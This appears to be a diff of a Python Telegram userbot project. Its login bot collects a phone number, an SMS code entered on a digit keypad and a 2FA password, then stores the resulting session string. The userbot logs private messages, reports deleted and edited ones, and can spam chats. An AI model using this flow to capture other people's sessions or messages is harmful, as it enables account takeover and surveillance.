@@ -45,6 +45,20 @@ dp = Dispatcher(reg_bot)
 
 temp_auth = {}
 
+# ========== КНОПКИ ДЛЯ КОДА ==========
+def get_code_keyboard():
+    kb = aiogram_types.InlineKeyboardMarkup(row_width=3)
+    buttons = []
+    for i in range(1, 10):
+        buttons.append(aiogram_types.InlineKeyboardButton(str(i), callback_data=f"c_{i}"))
+    kb.add(*buttons)
+    kb.row(
+        aiogram_types.InlineKeyboardButton("0", callback_data="c_0"),
+        aiogram_types.InlineKeyboardButton("⌫", callback_data="c_del"),
+        aiogram_types.InlineKeyboardButton("✅", callback_data="c_ok")
+    )
+    return kb
+
 # ========== РЕГИСТРАЦИЯ ЧЕРЕЗ БОТА ==========
 
 @dp.message_handler(commands=['start'])
@@ -74,67 +88,77 @@ async def get_phone(message: aiogram_types.Message):
             "client": client,
             "phone": phone,
             "hash": result.phone_code_hash,
-            "step": "code",
-            "code": ""
+            "code": "",
+            "message_id": None
         }
         
-        kb = aiogram_types.InlineKeyboardMarkup(row_width=3)
-        for i in range(1, 10):
-            kb.insert(aiogram_types.InlineKeyboardButton(str(i), callback_data=f"code_{i}"))
-        kb.row(
-            aiogram_types.InlineKeyboardButton("0", callback_data="code_0"),
-            aiogram_types.InlineKeyboardButton("⌫", callback_data="code_del"),
-            aiogram_types.InlineKeyboardButton("✅", callback_data="code_ok")
+        msg = await message.answer(
+            "📱 Введи код из SMS (5 цифр):\n\nТекущий код: ` `",
+            parse_mode="Markdown",
+            reply_markup=get_code_keyboard()
         )
+        temp_auth[user_id]["message_id"] = msg.message_id
         
-        await message.answer("📱 Введи код из SMS (5 цифр):", reply_markup=aiogram_types.ReplyKeyboardRemove())
-        await message.answer("Используй кнопки:", reply_markup=kb)
+        await message.answer("Используй кнопки ниже:", reply_markup=aiogram_types.ReplyKeyboardRemove())
         
     except Exception as e:
         await message.answer(f"❌ Ошибка: {e}")
 
-@dp.callback_query_handler(lambda c: c.data.startswith('code_'))
+@dp.callback_query_handler(lambda c: c.data.startswith('c_'))
 async def code_callback(callback: aiogram_types.CallbackQuery):
     user_id = callback.from_user.id
     
     if user_id not in temp_auth:
-        await callback.answer("Начни заново: /start")
-        try:
-            await callback.message.delete()
-        except:
-            pass
+        await callback.answer("❌ Сессия истекла, начни заново /start")
+        await callback.message.delete()
         return
     
     data = callback.data
+    action = data[2:]  # убираем "c_"
     
-    if data == "code_del":
-        temp_auth[user_id]["code"] = temp_auth[user_id]["code"][:-1]
-    elif data == "code_ok":
-        code = temp_auth[user_id]["code"]
-        if len(code) == 5:
+    current_code = temp_auth[user_id]["code"]
+    
+    if action == "del":
+        new_code = current_code[:-1]
+        temp_auth[user_id]["code"] = new_code
+        await callback.answer("Удалено")
+        
+    elif action == "ok":
+        if len(current_code) == 5:
             await callback.answer("Авторизация...")
             await complete_auth(callback, user_id)
+            return
         else:
-            await callback.answer(f"Нужно 5 цифр (сейчас {len(code)})", show_alert=True)
-        return
+            await callback.answer(f"Нужно 5 цифр (сейчас {len(current_code)})", show_alert=True)
+            return
     else:
-        digit = data.split("_")[1]
-        if len(temp_auth[user_id]["code"]) < 5:
-            temp_auth[user_id]["code"] += digit
+        # цифра
+        if len(current_code) < 5:
+            new_code = current_code + action
+            temp_auth[user_id]["code"] = new_code
+            await callback.answer(f"Добавлено {action}")
+        else:
+            await callback.answer("Уже 5 цифр, нажми ✅", show_alert=True)
+            return
     
-    code = temp_auth[user_id]["code"]
-    text = f"📱 Введи код из SMS\n\nТекущий код: `{code}`\n{'✅ Готово' if len(code) == 5 else '❌ Нужно 5 цифр'}"
+    # Обновляем сообщение
+    new_code = temp_auth[user_id]["code"]
+    code_display = new_code if new_code else " "
+    text = f"📱 Введи код из SMS (5 цифр):\n\nТекущий код: `{code_display}`\n\n{'' if len(new_code) == 5 else 'Осталось ' + str(5 - len(new_code)) + ' цифр'}"
     
     try:
-        await callback.message.edit_text(text, parse_mode="Markdown")
-    except:
-        pass
+        await callback.message.edit_text(
+            text,
+            parse_mode="Markdown",
+            reply_markup=get_code_keyboard()
+        )
+    except Exception as e:
+        print(f"Edit error: {e}")
     
     await callback.answer()
 
 async def complete_auth(callback, user_id: int):
     data = temp_auth[user_id]
-    message = callback.message
     
     try:
         await data["client"].sign_in(
@@ -148,10 +172,10 @@ async def complete_auth(callback, user_id: int):
                       (user_id, session_str))
         conn.commit()
         
-        await message.answer("✅ Авторизация успешна!")
+        await callback.message.answer("✅ Авторизация успешна!")
         
         if user_id in ADMIN_IDS:
-            await message.answer("✅ Ты авторизован как владелец! Юзербот будет перезапущен.")
+            await callback.message.answer("✅ Ты авторизован как владелец! Юзербот запускается...")
             asyncio.create_task(restart_userbot())
         
         await data["client"].disconnect()
@@ -160,10 +184,10 @@ async def complete_auth(callback, user_id: int):
     except Exception as e:
         error_msg = str(e)
         if "2FA" in error_msg or "password" in error_msg.lower():
+            await callback.message.answer("🔐 Введи пароль от 2FA текстовым сообщением:")
             temp_auth[user_id]["step"] = "2fa"
-            await message.answer("🔐 Введи пароль от 2FA текстовым сообщением:")
         else:
-            await message.answer(f"❌ Ошибка: {e}")
+            await callback.message.answer(f"❌ Ошибка: {e}")
 
 @dp.message_handler(lambda msg: msg.from_user.id in temp_auth and temp_auth[msg.from_user.id].get("step") == "2fa")
 async def handle_2fa(message: aiogram_types.Message):
@@ -182,7 +206,7 @@ async def handle_2fa(message: aiogram_types.Message):
         await message.answer("✅ Авторизация с 2FA успешна!")
         
         if user_id in ADMIN_IDS:
-            await message.answer("✅ Ты авторизован как владелец! Юзербот будет перезапущен.")
+            await message.answer("✅ Ты авторизован как владелец! Юзербот запускается...")
             asyncio.create_task(restart_userbot())
         
         await data["client"].disconnect()
@@ -206,7 +230,7 @@ async def restart_userbot():
             owner_id = admin_id
             user_client = TelegramClient(StringSession(row[0]), API_ID, API_HASH)
             await user_client.connect()
-            print(f"✅ Юзербот перезапущен для {owner_id}")
+            print(f"✅ Юзербот запущен для {owner_id}")
             register_handlers()
             break
 
@@ -218,26 +242,21 @@ def register_handlers():
     if not user_client:
         return
     
-    # Загружаем замьюченных пользователей
     cursor.execute('SELECT user_id FROM muted_users')
     muted_users = {row[0] for row in cursor.fetchall()}
     
-    # ========== 1. ОБРАБОТКА ВХОДЯЩИХ СООБЩЕНИЙ ==========
     @user_client.on(events.NewMessage(incoming=True))
     async def incoming_handler(event):
-        # Только ЛС
         if not isinstance(event.message.peer_id, PeerUser):
             return
         
         sender_id = event.sender_id
         
-        # Проверка на мут
         if sender_id in muted_users:
             await event.delete()
             print(f"🗑 Удалено сообщение от замьюченного {sender_id}")
             return
         
-        # Сохраняем сообщение
         text = event.message.text or ""
         if text:
             cursor.execute('INSERT OR REPLACE INTO messages (msg_id, user_id, chat_id, text, date) VALUES (?, ?, ?, ?, ?)',
@@ -245,10 +264,8 @@ def register_handlers():
             conn.commit()
             stored_messages[(event.chat_id, event.message.id)] = text
     
-    # ========== 2. ОТСЛЕЖИВАНИЕ УДАЛЕННЫХ СООБЩЕНИЙ ==========
     @user_client.on(events.MessageDeleted)
     async def deleted_handler(event):
-        # Только ЛС
         if not isinstance(event.chat, PeerUser):
             return
         
@@ -267,16 +284,13 @@ def register_handlers():
                         f"🗑 <b>{name}</b>{username} удалил сообщение:\n\n<blockquote>{old_text[:500]}</blockquote>",
                         parse_mode='HTML'
                     )
-                except Exception as e:
-                    print(f"Ошибка при отправке уведомления об удалении: {e}")
-                
+                except:
+                    pass
                 cursor.execute('DELETE FROM messages WHERE msg_id=?', (msg_id,))
                 conn.commit()
     
-    # ========== 3. ОТСЛЕЖИВАНИЕ ИЗМЕНЕННЫХ СООБЩЕНИЙ ==========
     @user_client.on(events.MessageEdited)
     async def edited_handler(event):
-        # Только ЛС и не свои сообщения
         if not isinstance(event.message.peer_id, PeerUser) or event.out:
             return
         
@@ -301,18 +315,13 @@ def register_handlers():
                         f"<b>Стало:</b>\n<blockquote>{new_text[:200]}</blockquote>",
                         parse_mode='HTML'
                     )
-                except Exception as e:
-                    print(f"Ошибка при отправке уведомления об изменении: {e}")
-                
+                except:
+                    pass
                 cursor.execute('UPDATE messages SET text=? WHERE msg_id=?', (new_text, msg_id))
                 conn.commit()
     
-    # ========== 4. КОМАНДЫ ЮЗЕРБОТА (только для владельца) ==========
     @user_client.on(events.NewMessage(outgoing=True))
     async def command_handler(event):
-        global muted_users
-        
-        # Только ЛС
         if not isinstance(event.message.peer_id, PeerUser):
             return
         
@@ -323,25 +332,21 @@ def register_handlers():
         
         print(f"📨 Команда: {text}")
         
-        # .help
         if text == '.help':
             help_text = """<b>📝 Команды юзербота (только ЛС)</b>
 
 <blockquote>
 ▫️ <b>.help</b> - эта справка
-▫️ <b>.mute</b> (ответ на сообщение) - заглушить пользователя
+▫️ <b>.mute</b> (ответ на сообщение) - заглушить
 ▫️ <b>.unmute</b> (ответ на сообщение) - разглушить
-▫️ <b>.info</b> (ответ на сообщение) - информация о пользователе
+▫️ <b>.list</b> - список замьюченных
+▫️ <b>.info</b> (ответ на сообщение) - инфо о пользователе
 ▫️ <b>.type [текст]</b> - эффект печати
 ▫️ <b>.spam [кол-во] [текст]</b> - спам (макс 20)
-▫️ <b>.list</b> - список замьюченных
-</blockquote>
-
-<i>Юзербот работает только в личных сообщениях</i>"""
+</blockquote>"""
             await event.edit(help_text, parse_mode='HTML')
             return
         
-        # .mute
         if text == '.mute':
             reply = await event.get_reply_message()
             if reply and reply.sender_id and reply.sender_id != owner_id:
@@ -349,19 +354,15 @@ def register_handlers():
                 cursor.execute('INSERT OR IGNORE INTO muted_users (user_id) VALUES (?)', (user_id,))
                 conn.commit()
                 muted_users.add(user_id)
-                
                 try:
                     user = await user_client.get_entity(user_id)
-                    name = user.first_name or "Пользователь"
-                    await event.edit(f'🔕 {name} заглушен')
+                    await event.edit(f'🔕 {user.first_name} заглушен')
                 except:
                     await event.edit(f'🔕 Пользователь {user_id} заглушен')
-                print(f"✅ Заглушен {user_id}")
             else:
                 await event.edit('❌ Ответь на сообщение пользователя')
             return
         
-        # .unmute
         if text == '.unmute':
             reply = await event.get_reply_message()
             if reply and reply.sender_id:
@@ -369,35 +370,29 @@ def register_handlers():
                 cursor.execute('DELETE FROM muted_users WHERE user_id=?', (user_id,))
                 conn.commit()
                 muted_users.discard(user_id)
-                
                 try:
                     user = await user_client.get_entity(user_id)
-                    name = user.first_name or "Пользователь"
-                    await event.edit(f'🔔 {name} разглушен')
+                    await event.edit(f'🔔 {user.first_name} разглушен')
                 except:
                     await event.edit(f'🔔 Пользователь {user_id} разглушен')
-                print(f"✅ Разглушен {user_id}")
             else:
                 await event.edit('❌ Ответь на сообщение пользователя')
             return
         
-        # .list - список замьюченных
         if text == '.list':
             if muted_users:
                 names = []
-                for uid in muted_users:
+                for uid in list(muted_users)[:20]:
                     try:
                         user = await user_client.get_entity(uid)
-                        name = f"{user.first_name or ''} {user.last_name or ''}".strip()
-                        names.append(f"• {name} ({uid})")
+                        names.append(f"• {user.first_name} ({uid})")
                     except:
                         names.append(f"• {uid}")
-                await event.edit(f"🔕 <b>Замьюченные пользователи:</b>\n\n" + "\n".join(names), parse_mode='HTML')
+                await event.edit(f"🔕 <b>Замьюченные:</b>\n\n" + "\n".join(names), parse_mode='HTML')
             else:
-                await event.edit("🔕 Нет замьюченных пользователей")
+                await event.edit("🔕 Нет замьюченных")
             return
         
-        # .info
         if text == '.info':
             reply = await event.get_reply_message()
             if reply and reply.sender_id:
@@ -408,7 +403,7 @@ def register_handlers():
                     username = f"@{user.username}" if user.username else "нет"
                     is_muted = "✅ Да" if user_id in muted_users else "❌ Нет"
                     
-                    info = f"""<b>👤 Информация о пользователе</b>
+                    info = f"""<b>👤 Инфо</b>
 
 <b>ID:</b> <code>{user_id}</code>
 <b>Имя:</b> {name}
@@ -419,10 +414,9 @@ def register_handlers():
                 except Exception as e:
                     await event.edit(f"❌ Ошибка: {e}")
             else:
-                await event.edit('❌ Ответь на сообщение пользователя')
+                await event.edit('❌ Ответь на сообщение')
             return
         
-        # .type
         if text.startswith('.type '):
             typing_text = text[6:]
             if typing_text:
@@ -437,7 +431,6 @@ def register_handlers():
                     await asyncio.sleep(0.3)
             return
         
-        # .spam
         if text.startswith('.spam '):
             parts = text.split(' ', 2)
             if len(parts) >= 2:
@@ -455,17 +448,16 @@ def register_handlers():
                         for i in range(count):
                             await user_client.send_message(event.chat_id, msg_text)
                             await asyncio.sleep(0.3)
-                        print(f"✅ Отправлено {count} сообщений")
                 except:
                     pass
             return
 
-# ========== ВЕБ-СЕРВЕР ДЛЯ RAILWAY ==========
+# ========== ВЕБ-СЕРВЕР ==========
 flask_app = Flask(__name__)
 
 @flask_app.route('/')
 def health():
-    return "UserBot Running!"
+    return "OK"
 
 def run_web():
     flask_app.run(host='0.0.0.0', port=8080)
@@ -492,8 +484,7 @@ async def main():
             else:
                 print(f"❌ Сессия для {admin_id} недействительна")
     
-    print("⚠️ Нет действительной сессии админа.")
-    print("📱 Напиши /start боту и авторизуйся")
+    print("⚠️ Нет сессии админа. Напиши /start боту и авторизуйся")
     
     while True:
         await asyncio.sleep(10)
